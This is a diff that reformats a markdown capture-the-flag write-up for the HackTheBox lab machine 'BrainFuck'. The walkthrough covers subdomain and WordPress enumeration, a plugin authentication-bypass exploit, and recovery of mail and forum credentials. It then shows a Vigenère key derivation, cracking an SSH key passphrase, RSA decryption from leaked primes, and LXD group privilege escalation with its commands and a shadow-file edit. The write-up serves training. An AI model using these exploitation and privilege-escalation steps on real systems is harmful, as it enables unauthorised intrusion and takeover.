@@ -11,9 +11,11 @@ image:
 ---
 
 # Overview 
+
 This is the second machine from OSCP's TJNull's OSCP List for HackTheBox.
 
 This machine begins w/ us enumerating several subdomains via NMAP's HTTPS script, followed by a wordpress plugin exploit that allowed us to login to an admin account w/o any credentials.
+
 Next, we discovered another wordpress plugin, that stores SMTP credentials of user `orestis`, and via inspect element, we can unobscure the password.
 
 With the SMTP credentials, we access the SMTP Server as `orestis` and found email that revealed credentials for the forum. 
@@ -24,23 +26,23 @@ To root, there are 2 ways, on `orestis` home directory there is a RSA encryption
 
 Another way (unintended way) is via LXD groups where `orestis` belongs to. It allows `orestis` to create a container that mounts the entire filesystem onto the container, allowing us root access to the system.
 
-
 ---
 
-| Column       | Details     |
-| ------------ | ----------- |
-| Box Name     | BrainFuck   |
-| IP           | 10.10.10.17 |
-| Points       | -           |
-| Difficulty   | Insane      |
-| Creator      |       [ch4p](https://app.hackthebox.com/users/1)      |
-| Release Date | 29-Apr-2017            |
-
+| Column       | Details                                    |
+|--------------|--------------------------------------------|
+| Box Name     | BrainFuck                                  |
+| IP           | 10.10.10.17                                |
+| Points       | -                                          |
+| Difficulty   | Insane                                     |
+| Creator      | [ch4p](https://app.hackthebox.com/users/1) |
+| Release Date | 29-Apr-2017                                |
 
 # Recon
 
 ## TCP/443 (HTTPS)
+
 ### FFUF
+
 ```
 ┌──(root💀kali)-[~/htb/brainfuck]
 └─# ffuf -u https://brainfuck.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 
@@ -73,9 +75,11 @@ xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
 :: Progress: [4615/4615] :: Job [1/1] :: 1106 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 
 ```
+
 - `wordpress` CMS is running
 
 ### NMAP
+
 ```
 Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 -sV -p 443 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_nmap.txt -oX /root/htb/brainfuck/10.10.10.17/scans/tcp443/xml/tcp_443_https_nmap.xml 10.10.10.17
 
@@ -122,6 +126,7 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 | krhc81zFeg==
 |_-----END CERTIFICATE-----
 ```
+
 - [Subdomains](https://blog.appsecco.com/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6)
 	- `sup3rs3cr3t.brainfuck.htb`
 	- `brainfuck.htb`
@@ -129,6 +134,7 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 # Initial Foothold
 
 ## TCP/443 (HTTPS) - WP Responsive Ticket System Plugin Exploit
+
 1. Add both subdomains to `/etc/hosts`
 2. Proceed to `https://brainfuck.htb`, view post (`Dev Update`)
 	![](Pasted%20image%2020220817022035.png)
@@ -136,6 +142,7 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	- `admin`
 3. Enumerate wordpress
 	1. Users
+
 		```
 		┌──(root💀kali)-[~/htb/brainfuck]
 		└─# wpscan --no-update --disable-tls-checks --url https://brainfuck.htb -e u -f cli-no-color 2>&1 |tee "/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_user_enum.txt"
@@ -156,9 +163,11 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 		 | Confirmed By: Login Error Messages (Aggressive Detection)
 		
 		```
+
 		- `admin`
 		- `administrator`
 	2. Plugins
+
 		```
 		┌──(root💀kali)-[~/htb/brainfuck]
 		└─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url https://brainfuck.htb -e ap -f cli-no-color 2>&1 | tee "/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_plugins_enum.txt"
@@ -212,25 +221,32 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 		 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 		```
+
 		- `wp-support-plus-responsive-ticket-system 7.1.3`
 		- `easy-wp-smtp`
-1. Find exploits for `wp support plus responsive ticket system 7.1.3`
+4. Find exploits for `wp support plus responsive ticket system 7.1.3`
 	
+
 	| Exploit Title                                                                     | Path                  |
+
 	| --------------------------------------------------------------------------------- | --------------------- |
+
 	| WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3  Privilege Escala | php/webapps/41006.txt |
+
 	| WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3  SQL Injection    | php/webapps/40939.txt |
 
-6. Try `php/webapps/41006.txt - Privilege Escalation`
+5. Try `php/webapps/41006.txt - Privilege Escalation`
 	1. This exploit allows you to login as any user due to of an incorrect usage of `wp_set_auth_cookie()`.
 	2. Create form `exploit.html`
 		![](Pasted%20image%2020220817033059.png)
 	3. Host form w/ python webserver
+
 		```
 		┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/exploit]
 		└─# python3 -m http.server 80
 		Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...		
 		```
+
 	4. Proceed to `http://localhost/exploit.html` and click `Login`
 		![](Pasted%20image%2020220817033222.png)
 	5. Allow it to process for a moment, and you are Admin!
@@ -241,8 +257,8 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	![](Pasted%20image%2020220817040252.png)
 	- `kHGuERB29DNiNE`
 
-
 ## Accessing SMTP Server
+
 1. Launch `Thunderbird` to view email
 	![](Pasted%20image%2020220818022505.png)
 2. View `Forum Access Details` email
@@ -251,6 +267,7 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	- This is likely used for `sup3rs3cr3t.brainfuck.htb` subdomain
 
 ## TCP/443 (HTTPS) - Encrypted text
+
 1. Proceed to `sup3rs3cr3t.brainfuck.htb` & login w/ `orestis:kIEnnfEKJ#9UmdO`
 	![](Pasted%20image%2020220818020211.png)
 2. View `SSH Access` post
@@ -271,9 +288,10 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 		- `sp_ptr` is likely `id_rsa`
 4. We can figure out the encryption key via [known-plaintext attack](https://en.wikipedia.org/wiki/Known-plaintext_attack)
 
-
 ## Derive encryption key w/ Vigenere Cipher (Subtraction)
+
 1. **Example** of encrypting a `Plaintext` w/ a `Key`
+
 	```
 	Plaintext: THIS IS SECRET
 	Key: 	   XVHE UW NOPGDZ
@@ -283,8 +301,11 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	Plaintext + Key = Ciphertext
 	T(19) + X(23) = Q(16)
 	```
+
 	![](Pasted%20image%2020220818034735.png)
+
 2. **Example** of deriving the `Key` from `Plaintext` & `Ciphertext`
+
 	```
 	Plaintext: THIS IS SECRET
 	Key: 	   XVHE UW NOPGDZ
@@ -293,8 +314,11 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	Key = Ciphertext - Plaintext
 	Key = Q(16) - T(19)
 	```
+
 	![](Pasted%20image%2020220818035327.png)
-4. Derive key 
+
+3. Derive key 
+
 	```
 	Ciphertext: Pieagnm - Jkoijeg nbw zwx mle grwsn
 	Plaintext:  Orestis - Hacking for fun and profit
@@ -315,15 +339,21 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	
 	Key = FUCKMYBRAIN
 	```
+
 	![](Pasted%20image%2020220818060216.png)
-5. Decrypt URL
+
+4. Decrypt URL
+
 	```
 	https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
 	```
+
 ![](Pasted%20image%2020220818060905.png)
 
 ## Derive encryption key w/ Vigenere Cipher (Vigenere Table)
+
 - Vigenere Table
+
 	```
 	Plaintext:  Orestis - Hacking for fun and profit
 	Ciphertext: Wejmvse - Fbtkqal zqb rso rnl cwihsf
@@ -345,20 +375,31 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	Key = FUCKMYBRAIN
 
 	```
+
 	![](Pasted%20image%2020220818052843.png)
+
 	![](Pasted%20image%2020220818052923.png)
+
 	![](Pasted%20image%2020220818053003.png)
+
 	![](Pasted%20image%2020220818053118.png)
+
 	![](Pasted%20image%2020220818053208.png)
+
 	![](Pasted%20image%2020220818053329.png)
+
 	![](Pasted%20image%2020220818053409.png)
+
 	![](Pasted%20image%2020220818053540.png)
+
 	![](Pasted%20image%2020220818053645.png)
+
 	![](Pasted%20image%2020220818053722.png)
 
-
 ## TCP/22 (SSH)
+
 1. Download the key
+
 	```
 	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
 	└─# curl https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --insecure > id_rsa; chmod 600 id_rsa
@@ -366,13 +407,17 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	                                 Dload  Upload   Total   Spent    Left  Speed
 	100  1766  100  1766    0     0  11118      0 --:--:-- --:--:-- --:--:-- 11106
 	```
+
 2. SSH w/ downloaded key
+
 	```
 	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
 	└─# ssh orestis@$ip -i id_rsa 
 	Enter passphrase for key 'id_rsa': 
 	```
+
 3. Crack SSH pass
+
 	```
 	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
 	└─# /root/tools/john/run/ssh2john.py id_rsa > id_rsa_john
@@ -389,15 +434,17 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	Use the "--show" option to display all of the cracked passwords reliably
 	Session completed. 
 	```
+
 	- `3poulakia!`
 4. SSH & Obtain User Flag
 ![](Pasted%20image%2020220819025428.png)
 
-
 # Privilege Escalation
 
 ## Root - Via Cracking/Reverse Engineering RSA
+
 1. View files in `orestis` home directory
+
 	```
 	orestis@brainfuck:~$ ls -l
 	total 28
@@ -410,7 +457,9 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
 	
 	```
+
 2. View `encrypt.sage`
+
 	```
 	nbits = 1024
 	
@@ -436,7 +485,9 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	debug.write(str(e)+'\n')
 	
 	```
+
 	![](Pasted%20image%2020220819041906.png)
+
 	- `p, q, e` - suggests that it is RSA
 		- We have the values of `p, q, e` in `debug.txt`
 	- `ct/ciphertext/enc_pass` - ciphertext/output of encoding root.txt`
@@ -449,6 +500,7 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	- For RSA to be secure, `p` and `q` must be kept secret. With access to `p`, `q`, and `e`, calculating `d` (the decryption key) is trivial. 
 	- [Source](https://security.stackexchange.com/a/25632)
 4. Google for a script that will do the above for us
+
 	```
 	def egcd(a, b):
 	    x,y, u,v = 0,1, 1,0
@@ -485,10 +537,12 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	if __name__ == "__main__":
 	    main()
 	```
+
 	- [Source](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)
 	- Obtain values of `p, q, e` from `debug.txt`
 	- Obtain values of `ct - ciphertext` from `output.txt`
 5. Run decrypt script
+
 	```
 	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
 	└─# python decrypt.py 
@@ -496,29 +550,34 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
 	
 	```
+
 	- Then convert `pt - plaintxt` to `Hex` and then to `ASCII`
 		- `m = Integer(int(password.encode('hex'),16))` - due to this line of code (Line 6)
 6. Convert
 ![](Pasted%20image%2020220819051338.png)
 ![](Pasted%20image%2020220819051359.png)
 7. Root Flag
+
 	```
 	6efc1a5dbb8904751ce6566a305bb8ef
 	```
 
-
 ## Root - Via LXD
+
 1. View groups that `orestis` belongs to
+
 	```
 	orestis@brainfuck:~$ groups
 	orestis adm cdrom dip plugdev lxd lpadmin sambashare
 	```
+
 	- `lxd`
 2. [LXD Group Exploit](https://yufongg.github.io/posts/LXD-Group/)
 	- A member of the `lxd` group can easily privilege escalate to root because LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket.
 	- We are able to use `lxd` to mount the entire victim's filesystem into a container, allowing us to have root access to the entire system.
 3. [Download](https://github.com/saghul/lxd-alpine-builder) and transfer image onto `brainfuck.htb`
 4. Exploit
+
 	```
 	# import image(.tar file) into lxc
 	lxc image import ./alpine.tar.gz --alias privesc
@@ -535,11 +594,16 @@ Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 
 	# Execute the container and get an interactive shell
 	lxc exec privesc-container /bin/sh
 	```
+
 	![](Pasted%20image%2020220819052441.png)
-4. To obtain root, replace root hash w/ `orestis`'s 
+
+5. To obtain root, replace root hash w/ `orestis`'s 
+
 	```
 	vi /mnt/root/etc/shadow
 	```
+
 	![](Pasted%20image%2020220819060640.png)
-5. Switch to root w/ `orestis`'s password `kHGuERB29DNiNE`
+
+6. Switch to root w/ `orestis`'s password `kHGuERB29DNiNE`
 	![](Pasted%20image%2020220819060751.png)
